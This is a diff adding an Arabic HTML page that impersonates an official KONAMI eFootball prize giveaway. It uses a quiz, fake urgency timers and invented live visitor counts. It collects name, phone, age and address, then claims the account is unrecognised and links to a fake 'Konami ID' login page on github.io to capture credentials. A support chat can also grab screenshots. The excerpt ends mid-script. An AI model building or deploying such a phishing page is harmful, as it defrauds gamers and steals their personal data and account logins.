@@ -1,0 +1,2025 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقات وجوائز efootball</title>
+
+    <!-- الخطوط الرسمية عالي الجودة -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800;900&display=swap" rel="stylesheet">
+
+    <!-- مكتبة التقاط الشاشة -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+
+    <style>
+        /* ==========================================
+           التنسيقات الرئيسية والألوان (Konami & eFootball)
+           ========================================== */
+        :root {
+            --konami-red: #e60012;
+            --konami-red-glow: #ff1a2d;
+            --efootball-blue: #00f2fe;
+            --efootball-dark: #0a0b10;
+            --glass-bg: rgba(18, 12, 24, 0.75);
+            --glass-border: rgba(230, 0, 18, 0.35);
+            --glass-glow: 0 8px 32px 0 rgba(230, 0, 18, 0.25);
+            --text-main: #ffffff;
+            --text-gold: #ffb700;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Cairo', sans-serif;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: var(--efootball-dark);
+            color: var(--text-main);
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+            background-image: 
+                radial-gradient(circle at 20% 20%, rgba(230, 0, 18, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 80% 80%, rgba(0, 242, 254, 0.1) 0%, transparent 40%);
+            background-attachment: fixed;
+        }
+
+        /* خلفية التفاعلية المتحركة Canvas Particles */
+        #particle-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .main-wrapper {
+            position: relative;
+            z-index: 1;
+            max-width: 650px;
+            margin: 0 auto;
+            padding: 10px 12px 100px 12px;
+        }
+
+        /* ==========================================
+           الشريط العلوي الثابت والعدادات
+           ========================================== */
+        .sticky-header {
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+            background: rgba(10, 11, 16, 0.92);
+            backdrop-filter: blur(12px);
+            border-bottom: 2px solid var(--konami-red);
+            padding: 8px 10px;
+            margin-bottom: 15px;
+            border-radius: 0 0 16px 16px;
+            box-shadow: 0 4px 20px rgba(230, 0, 18, 0.3);
+        }
+
+        .support-buttons-row {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 8px;
+        }
+
+        .btn-support-link {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid rgba(255,255,255,0.2);
+            box-shadow: 0 0 10px rgba(37, 211, 102, 0.3);
+            transition: 0.3s;
+        }
+
+        .btn-support-link.telegram {
+            background: linear-gradient(135deg, #0088cc, #005580);
+            box-shadow: 0 0 10px rgba(0, 136, 204, 0.3);
+        }
+
+        /* الشريط النصي المتحرك */
+        .marquee-container {
+            background: rgba(230, 0, 18, 0.15);
+            border: 1px solid rgba(230, 0, 18, 0.4);
+            border-radius: 20px;
+            overflow: hidden;
+            white-space: nowrap;
+            padding: 4px 0;
+            margin-bottom: 8px;
+        }
+
+        .marquee-text {
+            display: inline-block;
+            animation: marquee 16s linear infinite;
+            color: #ffeb3b;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        @keyframes marquee {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        /* العدادات اللحظية والتنازلي */
+        .top-widgets-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 6px;
+            text-align: center;
+        }
+
+        .widget-box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 6px 4px;
+        }
+
+        .widget-title {
+            font-size: 10px;
+            color: #aaa;
+        }
+
+        .widget-value {
+            font-weight: 900;
+            font-size: 13px;
+            color: var(--efootball-blue);
+        }
+
+        .widget-value.timer {
+            color: #ff4757;
+        }
+
+        /* ==========================================
+           أزرار التنقل العامة (الرئيسية والعودة)
+           ========================================== */
+        .global-nav-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            gap: 10px;
+        }
+
+        .btn-nav-action {
+            background: rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            padding: 8px 16px;
+            border-radius: 25px;
+            font-size: 12px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .btn-nav-action:hover {
+            background: var(--konami-red);
+            border-color: #ff4757;
+            box-shadow: 0 0 12px var(--konami-red-glow);
+        }
+
+        /* ==========================================
+           بطاقات الخطوات (Card Stepper)
+           ========================================== */
+        .step-card {
+            display: none;
+            background: var(--glass-bg);
+            border: 1px solid var(--glass-border);
+            border-radius: 20px;
+            padding: 20px 16px;
+            box-shadow: var(--glass-glow);
+            backdrop-filter: blur(16px);
+            animation: fadeIn 0.4s ease-in-out forwards;
+        }
+
+        .step-card.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(12px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .brand-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .brand-title {
+            font-size: 22px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #ffffff, var(--konami-red-glow));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(230,0,18,0.5);
+            letter-spacing: 0.5px;
+        }
+
+        .brand-sub {
+            font-size: 12px;
+            color: #ccc;
+            margin-top: 4px;
+        }
+
+        /* جوائز المعرض */
+        .prizes-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 15px 0;
+        }
+
+        .prize-card {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid rgba(230, 0, 18, 0.4);
+            border-radius: 12px;
+            padding: 10px 6px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+
+        .prize-card:hover {
+            transform: translateY(-4px);
+            border-color: var(--efootball-blue);
+        }
+
+        .prize-badge {
+            position: absolute;
+            top: 0;
+            right: 0;
+            background: var(--konami-red);
+            color: #fff;
+            font-size: 8px;
+            font-weight: bold;
+            padding: 2px 6px;
+            border-bottom-left-radius: 8px;
+        }
+
+        .prize-icon {
+            font-size: 32px;
+            margin-bottom: 6px;
+            display: block;
+        }
+
+        .prize-name {
+            font-size: 11px;
+            font-weight: bold;
+            color: var(--text-gold);
+        }
+
+        /* زر الإجراء الرئيسي */
+        .btn-primary-action {
+            width: 100%;
+            background: linear-gradient(135deg, var(--konami-red), #b3000e);
+            color: #ffffff;
+            border: 2px solid #ff4757;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 900;
+            border-radius: 30px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(230, 0, 18, 0.6);
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+        }
+
+        .btn-primary-action:active {
+            transform: scale(0.97);
+        }
+
+        /* ==========================================
+           تحدي الأسئلة (Trivia)
+           ========================================== */
+        .quiz-timer-bar-container {
+            width: 100%;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .quiz-timer-progress {
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, #2ed573, #ff4757);
+            transition: width 1s linear;
+        }
+
+        .question-box {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 14px;
+            padding: 15px;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .question-title {
+            font-size: 15px;
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 12px;
+        }
+
+        .answers-list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .btn-answer {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            color: #fff;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 13.5px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: right;
+            transition: all 0.2s ease;
+        }
+
+        .btn-answer.correct {
+            background: rgba(46, 213, 115, 0.3) !important;
+            border-color: #2ed573 !important;
+            box-shadow: 0 0 15px rgba(46, 213, 115, 0.5);
+        }
+
+        .btn-answer.wrong {
+            background: rgba(255, 71, 87, 0.3) !important;
+            border-color: #ff4757 !important;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-8px); }
+            75% { transform: translateX(8px); }
+        }
+
+        /* ==========================================
+           نموذج البيانات الشخصية
+           ========================================== */
+        .form-group {
+            margin-bottom: 14px;
+            position: relative;
+        }
+
+        .form-label {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 6px;
+            color: #ddd;
+        }
+
+        .form-input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+
+        .form-control {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #fff;
+            padding: 12px 14px;
+            padding-left: 38px;
+            border-radius: 12px;
+            font-size: 13.5px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+
+        .form-control:focus {
+            border-color: var(--konami-red);
+            box-shadow: 0 0 10px rgba(230, 0, 18, 0.4);
+        }
+
+        .input-check-icon {
+            position: absolute;
+            left: 12px;
+            color: #2ed573;
+            font-size: 16px;
+            display: none;
+        }
+
+        .btn-field-help {
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: var(--efootball-blue);
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            font-size: 11px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-right: 6px;
+        }
+
+        /* ==========================================
+           شاشات التحميل والتنبيهات
+           ========================================== */
+        .loading-spinner-box {
+            text-align: center;
+            padding: 30px 10px;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-top: 5px solid var(--konami-red);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* الإشعارات اللحظية المنبثقة Live Toasts */
+        .toast-container {
+            position: fixed;
+            bottom: 90px;
+            right: 15px;
+            z-index: 9999;
+            pointer-events: none;
+        }
+
+        .live-toast {
+            background: rgba(13, 17, 23, 0.95);
+            border: 1px solid var(--konami-red);
+            border-radius: 12px;
+            padding: 10px 14px;
+            color: #fff;
+            font-size: 11.5px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.8), 0 0 10px rgba(230,0,18,0.3);
+            margin-top: 8px;
+            animation: slideInRight 0.4s ease forwards;
+            max-width: 280px;
+        }
+
+        @keyframes slideInRight {
+            from { opacity: 0; transform: translateX(50px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* شاشة انقطاع الإنترنت الدرع التكتيكي */
+        #offline-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(5, 5, 8, 0.96);
+            backdrop-filter: blur(20px);
+            z-index: 999999;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        /* ==========================================
+           تنسيقات المحادثة المباشرة - ألوان ببجي ومسابقات
+           ========================================== */
+        .top-support-bar {
+            text-align: center;
+            margin: 10px 0;
+        }
+        .btn-top-chat {
+            background: linear-gradient(135deg, #00c6ff, #0072ff);
+            color: #ffffff;
+            border: 1px solid #00f2fe;
+            padding: 8px 18px;
+            font-size: 13px;
+            font-weight: bold;
+            border-radius: 25px;
+            cursor: pointer;
+            box-shadow: 0 0 15px rgba(0, 198, 255, 0.4);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+        .btn-top-chat:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 22px rgba(0, 242, 254, 0.7);
+        }
+
+        .chat-widget-container {
+            position: fixed;
+            bottom: 85px;
+            left: 20px;
+            width: 350px;
+            max-width: 90vw;
+            height: 460px;
+            background: #0d1117;
+            border: 1px solid #1f293d;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.8), 0 0 20px rgba(0, 210, 255, 0.2);
+            display: flex;
+            flex-direction: column;
+            z-index: 99999;
+            overflow: hidden;
+            direction: rtl;
+            font-family: inherit;
+        }
+
+        .chat-header {
+            background: #161b22;
+            padding: 12px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #21262d;
+        }
+        .chat-header-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .chat-title {
+            color: #ffb700;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .chat-substatus {
+            color: #8b949e;
+            font-size: 11px;
+        }
+        .chat-close-btn {
+            background: transparent;
+            border: none;
+            color: #8b949e;
+            font-size: 18px;
+            cursor: pointer;
+        }
+        .chat-close-btn:hover { color: #ff4757; }
+
+        .status-dot, .chat-status-dot {
+            width: 10px;
+            height: 10px;
+            background-color: #2ed573;
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 8px #2ed573;
+        }
+        .status-dot.offline, .chat-status-dot.offline {
+            background-color: #747d8c;
+            box-shadow: none;
+        }
+
+        .chat-box {
+            flex: 1;
+            padding: 15px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            background: #090d12;
+        }
+
+        .msg {
+            max-width: 80%;
+            padding: 10px 14px;
+            border-radius: 14px;
+            font-size: 13px;
+            line-height: 1.5;
+            position: relative;
+            word-break: break-word;
+        }
+        .msg.user-msg {
+            align-self: flex-start;
+            background: linear-gradient(135deg, #0052d4, #4364f7);
+            color: #ffffff;
+            border-bottom-right-radius: 2px;
+        }
+        .msg.admin-msg {
+            align-self: flex-end;
+            background: #1f293d;
+            color: #e6edf3;
+            border: 1px solid #2d3748;
+            border-bottom-left-radius: 2px;
+        }
+        .msg img {
+            max-width: 100%;
+            border-radius: 8px;
+            margin-bottom: 5px;
+        }
+
+        .msg-meta {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 4px;
+            font-size: 10px;
+            color: rgba(255, 255, 255, 0.6);
+            margin-top: 4px;
+        }
+        .checkmark {
+            font-size: 11px;
+        }
+        .checkmark.read {
+            color: #00f2fe;
+            font-weight: bold;
+        }
+
+        .chat-input-area {
+            padding: 10px;
+            background: #161b22;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border-top: 1px solid #21262d;
+        }
+        #chat-user-input {
+            flex: 1;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            color: #fff;
+            padding: 8px 12px;
+            border-radius: 20px;
+            font-size: 13px;
+            outline: none;
+        }
+        #chat-user-input:focus {
+            border-color: #00c6ff;
+        }
+        .chat-btn-icon {
+            background: transparent;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            padding: 4px;
+            border-radius: 50%;
+        }
+        .chat-btn-icon:hover { background: #21262d; }
+
+        .chat-send-btn {
+            background: linear-gradient(135deg, #ffb700, #f5af19);
+            color: #000;
+            border: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .chat-file-preview {
+            background: #1f293d;
+            color: #00f2fe;
+            padding: 5px 12px;
+            font-size: 11px;
+            text-align: center;
+        }
+
+        .floating-chat-trigger {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 55px;
+            height: 55px;
+            background: linear-gradient(135deg, #ffb700, #ff8c00);
+            border: none;
+            border-radius: 50%;
+            color: #000;
+            font-size: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 183, 0, 0.5);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- خلفية الجسيمات الضوئية -->
+    <canvas id="particle-canvas"></canvas>
+
+    <!-- حاوية الإشعارات المباشرة -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <!-- درع انقطاع الاتصال -->
+    <div id="offline-overlay">
+        <div style="font-size: 60px; margin-bottom: 15px;">📡❌</div>
+        <h2 style="color: #ff4757; margin-bottom: 10px;">انقطع الاتصال بالإنترنت!</h2>
+        <p style="color: #ccc; font-size: 13px; max-width: 320px;">
+            يتطلب استكمال العمل وجود اتصال فعال بالشبكة. يرجى إعادة الاتصال بالإنترنت والمحاولة مجدداً.
+        </p>
+    </div>
+
+    <div class="main-wrapper">
+        
+        <!-- الشريط العلوي الثابت -->
+        <header class="sticky-header">
+            
+            <div class="support-buttons-row">
+                <a href="https://t.me/Pubg_Rivals" target="_blank" class="btn-support-link telegram" onclick="soundEngine.playClick()">
+                    💭 التليجرام
+                </a>
+                <a href="https://wa.me/77074032501" target="_blank" class="btn-support-link" onclick="soundEngine.playClick()">
+                    💬 الواتساب
+                </a>
+            </div>
+
+            <!-- زر المحادثة المباشرة العلوي -->
+            <div class="top-support-bar">
+                <button class="btn-top-chat" onclick="toggleChat(); soundEngine.playClick();">
+                    <span class="chat-status-dot" id="header-status-dot"></span>
+                    💬 المحادثة المباشرة مع الدعم الفني
+                </button>
+            </div>
+
+            <div class="marquee-container">
+                <div class="marquee-text">
+                    ⚠️ مرحباً بك في موقعنا، إذا عجزت عن التسجيل أو أردت المساعدة تواصل معنا • السحب أسبوعي برعاية منصة KONAMI الرسمية •
+                </div>
+            </div>
+
+            <div class="top-widgets-grid">
+                <div class="widget-box">
+                    <div class="widget-title">انتهاء التسجيل</div>
+                    <div class="widget-value timer" id="event-timer">00:00:00</div>
+                </div>
+                <div class="widget-box">
+                    <div class="widget-title">الزوار الآن</div>
+                    <div class="widget-value" id="live-visitors">164</div>
+                </div>
+                <div class="widget-box">
+                    <div class="widget-title">إجمالي المسجلين</div>
+                    <div class="widget-value" id="live-registered">842</div>
+                </div>
+            </div>
+        </header>
+
+        <!-- أزرار التنقل العامة -->
+        <div class="global-nav-bar">
+            <button class="btn-nav-action" onclick="goToStep(1)">
+                🏠 القائمة الرئيسية
+            </button>
+            <button class="btn-nav-action" onclick="goBackStep()">
+                ↩️ رجوع
+            </button>
+        </div>
+
+        <!-- ================= ==========================
+             الخطوة الأولى: المقدمة والجوائز
+             ========================================== -->
+        <div class="step-card active" id="step-1">
+            <div class="brand-header">
+                <div class="brand-title">مسابقات وجوائز efootball</div>
+                <div class="brand-sub">المنصة الرسمية للسحوبات المعتمدة - KONAMI </div>
+            </div>
+
+            <div style="background: rgba(230, 0, 18, 0.12); border-right: 4px solid var(--konami-red); padding: 10px; border-radius: 8px; font-size: 12.5px; margin-bottom: 15px;">
+                 **مرحباً بك في السحب الكبير!** شارك الآن في التحدي السريع واحصل على فرصة ربح شحنات كوينز وحزم أسطورية مجاناً.
+            </div>
+
+            <div style="font-size: 13px; font-weight: bold; color: var(--text-gold); margin-bottom: 8px;">
+                🏆 الجوائز المتاحة لهذا الأسبوع:
+            </div>
+
+            <div class="prizes-grid">
+                <div class="prize-card">
+                    <span class="prize-badge">الكبرى</span>
+                    <span class="prize-icon">🪙</span>
+                    <div class="prize-name">5,800 كوينز</div>
+                </div>
+                <div class="prize-card">
+                    <span class="prize-badge">أسطوري</span>
+                    <span class="prize-icon">🪪</span>
+                    <div class="prize-name">حزمة EPIC</div>
+                </div>
+                <div class="prize-card">
+                    <span class="prize-badge">مباشر</span>
+                    <span class="prize-icon">⚡</span>
+                    <div class="prize-name">نقاط eFootball</div>
+                </div>
+            </div>
+
+            <div style="font-size: 12px; color: #aaa; margin: 15px 0 10px 0;">
+                📝 **خطوات المشاركة المعتمدة:**
+            </div>
+            <ul style="font-size: 12px; color: #eee; padding-right: 18px; line-height: 1.8;">
+                <li>إكمال تحدي الأسئلة الكروية وتجاوز الاختبار.</li>
+                <li>تسجيل بيانات التواصل الخاصة بك للوصول إليك عند الفوز.</li>
+                <li>تسجيل الدخول بحسابك لضمان عدم التكرار وتأكيد الملكية.</li>
+            </ul>
+
+            <button class="btn-primary-action" onclick="startQuizChallenge()">
+                🚀 ابدأ المسابقة الآن
+            </button>
+        </div>
+
+        <!-- ================= ==========================
+             الخطوة الثانية: تحدي الأسئلة (Trivia Challenge)
+             ========================================== -->
+        <div class="step-card" id="step-2">
+            <div class="brand-header">
+                <div class="brand-title">تحدي معلومات efootball</div>
+                <div class="brand-sub">أجب عن 3 أسئلة صحيحة من أصل 5 للمرور</div>
+            </div>
+
+            <div class="quiz-timer-bar-container">
+                <div class="quiz-timer-progress" id="quiz-timer-bar"></div>
+            </div>
+
+            <div class="question-box">
+                <div class="question-title" id="question-text">جاري تحميل السؤال...</div>
+                <div class="answers-list" id="answers-container"></div>
+            </div>
+
+            <div style="text-align: center; font-size: 12px; color: #888;" id="quiz-progress-text">
+                السؤال 1 من 5
+            </div>
+        </div>
+
+        <!-- صفحة التهنئة بعد النجاح في الأسئلة -->
+        <div class="step-card" id="step-quiz-success">
+            <div class="brand-header">
+                <div style="font-size: 50px;">🎉🏆</div>
+                <div class="brand-title">تهانينا! لقد اجتزت التحدي</div>
+                <div class="brand-sub">أظهرت معرفة ممتازة بعالم efootball و Konami</div>
+            </div>
+
+            <p style="text-align: center; font-size: 13px; color: #ddd; margin-bottom: 20px;">
+                أنت الآن مؤهل رسمياً لدخول السحب النهائي على الجوائز. يرجى إكمال إدخال بياناتك لاستلام الجائزة فوراً.
+            </p>
+
+            <button class="btn-primary-action" onclick="goToStep(3)">
+                📝 إكمال بيانات التسجيل
+            </button>
+        </div>
+
+        <!-- ================= ==========================
+             الخطوة الثالثة: البيانات الشخصية
+             ========================================== -->
+        <div class="step-card" id="step-3">
+            <div class="brand-header">
+                <div class="brand-title">تسجيل بيانات المتسابق</div>
+                <div class="brand-sub">تأكد من كتابة المعلومات بشكل صحيح</div>
+            </div>
+
+            <form id="user-info-form" onsubmit="handleFormSubmit(event)">
+                
+                <div class="form-group">
+                    <div class="form-label">
+                        <span>الاسم الثلاثي:</span>
+                        <button type="button" class="btn-field-help" onclick="alert('اكتب اسمك الثلاثي بالحروف العربية أو الإنجليزية لتسجيله في بطاقات الفائزين.')">؟</button>
+                    </div>
+                    <div class="form-input-wrapper">
+                        <input type="text" id="input-fullname" class="form-control" placeholder="مثال: عبدالله محمد علي" autocomplete="name" required oninput="validateField(this, 'name')">
+                        <span class="input-check-icon" id="check-fullname">✔</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="form-label">
+                        <span>رقم الهاتف:</span>
+                        <button type="button" class="btn-field-help" onclick="alert('أدخل رقم هاتفك مع الرمز الدولي ليصلك إشعار الفوز عبر الواتساب.')">؟</button>
+                    </div>
+                    <div class="form-input-wrapper">
+                        <input type="tel" id="input-phone" class="form-control" placeholder="مثال: +967 770000000" autocomplete="tel" required oninput="validateField(this, 'phone')">
+                        <span class="input-check-icon" id="check-phone">✔</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="form-label">
+                        <span>العمر:</span>
+                        <button type="button" class="btn-field-help" onclick="alert('أدخل عمرك بالأرقام فقط.')">؟</button>
+                    </div>
+                    <div class="form-input-wrapper">
+                        <input type="number" id="input-age" class="form-control" placeholder="مثال: 20" autocomplete="off" required oninput="validateField(this, 'age')">
+                        <span class="input-check-icon" id="check-age">✔</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="form-label">
+                        <span>العنوان (الدولة / المدينة):</span>
+                        <button type="button" class="btn-field-help" onclick="alert('اكتب دولتك ومدينتك لتحديد أقرب سيرفر جوائز.')">؟</button>
+                    </div>
+                    <div class="form-input-wrapper">
+                        <input type="text" id="input-address" class="form-control" placeholder="مثال: اليمن، صنعاء" autocomplete="street-address" required oninput="validateField(this, 'text')">
+                        <span class="input-check-icon" id="check-address">✔</span>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <div class="form-label">
+                        <span>معرف الحساب (eFootball ID) - اختياري:</span>
+                        <button type="button" class="btn-field-help" onclick="alert('يمكنك ترك هذه الخانة فارغة إذا لم تكن تحفظ الآيدي الخاص بك.')">؟</button>
+                    </div>
+                    <div class="form-input-wrapper">
+                        <input type="text" id="input-accid" class="form-control" placeholder="مثال: 849-204-193 (اختياري)" autocomplete="off">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-primary-action">
+                    حفظ ومتابعة ➔
+                </button>
+            </form>
+        </div>
+
+        <!-- صفحة الانتظار والتحقق من البيانات -->
+        <div class="step-card" id="step-verifying">
+            <div class="loading-spinner-box">
+                <div class="spinner"></div>
+                <h3 style="color: var(--efootball-blue); margin-bottom: 8px;">جاري فحص البيانات والتأكد من السجلات...</h3>
+                <p style="font-size: 12px; color: #aaa;">يرجى الانتظار لحظة واحدة</p>
+            </div>
+        </div>
+
+        <!-- صفحة نتيجة عدم التعرف على الحساب -->
+        <div class="step-card" id="step-unrecognized">
+            <div class="brand-header">
+                <div style="font-size: 45px; color: #ff4757;">⚠️</div>
+                <div class="brand-title" style="font-size: 18px;">لم نتعرف على حسابك تلقائياً</div>
+            </div>
+
+            <div style="background: rgba(255, 71, 87, 0.15); border: 1px solid #ff4757; border-radius: 12px; padding: 14px; text-align: center; font-size: 13px; margin-bottom: 20px;">
+                قم بتسجيل الدخول لتأكيد ملكية حسابك واحجز مقعدك في السحب.
+            </div>
+
+            <button class="btn-primary-action" onclick="startFinalLoginProcess()">
+                🔐 تسجيل الدخول وتأكيد الملكية
+            </button>
+        </div>
+
+        <!-- ================= ==========================
+             الخطوة الرابعة: طلب تسجيل الدخول الخارجي
+             ========================================== -->
+        <div class="step-card" id="step-4">
+            <div class="loading-spinner-box" id="login-loading-state">
+                <div class="spinner"></div>
+                <h3 style="color: #ffb700;">جاري فتح ( موقع كونامي ) الرسمي...</h3>
+                <p style="font-size: 12px; color: #aaa; margin-top: 6px;">تأكيد الاتصال الآمن SSL 256-bit</p>
+            </div>
+
+            <div id="login-redirect-state" style="display: none; text-align: center;">
+                <div style="font-size: 50px; margin-bottom: 10px;">🛡️</div>
+                <h3 style="color: #fff; margin-bottom: 10px;">تأكيد ملكية حساب Konami ID</h3>
+                <p style="font-size: 12.5px; color: #ccc; margin-bottom: 20px;">
+                    اضغط على الزر أدناه للانتقال المباشر لصفحة التسجيل المعتمدة لإكمال التسجيل.
+                </p>
+
+                <a href="https://pubgrivals7-png.github.io/-/konami.html" target="_blank" class="btn-primary-action" onclick="soundEngine.playSuccess(); trackAction('Click Konami Login Link');">
+                    🔑 تسجيل الدخول عبر Konami ID
+                </a>
+            </div>
+        </div>
+
+        <!-- 2. نافذة الدردشة العائمة -->
+        <div id="chat-widget" class="chat-widget-container" style="display: none;">
+            <div class="chat-header">
+                <div class="chat-header-info">
+                    <span class="status-dot" id="support-status-dot"></span>
+                    <div>
+                        <div class="chat-title">الدعم الفني للمسابقة</div>
+                        <div class="chat-substatus" id="support-status-text">متصل الآن</div>
+                    </div>
+                </div>
+                <button class="chat-close-btn" onclick="toggleChat(); soundEngine.playClick();">✕</button>
+            </div>
+
+            <div class="chat-box" id="chat-box"></div>
+
+            <div id="chat-file-preview" class="chat-file-preview" style="display:none;">
+                تم اختيار صورة جاهزة للإرسال ✔
+            </div>
+
+            <form class="chat-input-area" onsubmit="sendChatMessage(event)">
+                <label for="chat-file-input" class="chat-btn-icon" title="إرفاق صورة">
+                    📷
+                    <input type="file" id="chat-file-input" accept="image/*" style="display:none;" onchange="showChatFilePreview()">
+                </label>
+                
+                <button type="button" class="chat-btn-icon" title="التقاط الشاشة وإرسالها فوراً" onclick="takeUserInstantScreenshot()">
+                    📸
+                </button>
+
+                <input type="text" id="chat-user-input" placeholder="اكتب رسالتك..." autocomplete="off" oninput="saveDraftMessage()">
+                <button type="submit" class="chat-send-btn">إرسال</button>
+            </form>
+        </div>
+
+        <!-- 3. زر دائري عائم أسفل الشاشة -->
+        <button class="floating-chat-trigger" onclick="toggleChat(); soundEngine.playClick();" title="الدعم المباشر">
+            🎧
+        </button>
+
+    </div>
+
+    <!-- ================= ==========================
+         المحرك البرمجي الرئيسي JavaScript
+         ========================================== -->
+    <script>
+        // ==========================================
+        // 1. المحرك الصوتي الفائق (Web Audio API Synthetics)
+        // ==========================================
+        class SoundEngine {
+            constructor() {
+                this.ctx = null;
+            }
+
+            init() {
+                if (!this.ctx) {
+                    this.ctx = new (window.AudioContext || window.webkitAudioContext)();
+                }
+            }
+
+            playClick() {
+                this.init();
+                try {
+                    const osc = this.ctx.createOscillator();
+                    const gain = this.ctx.createGain();
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(800, this.ctx.currentTime);
+                    osc.frequency.exponentialRampToValueAtTime(400, this.ctx.currentTime + 0.05);
+                    gain.gain.setValueAtTime(0.3, this.ctx.currentTime);
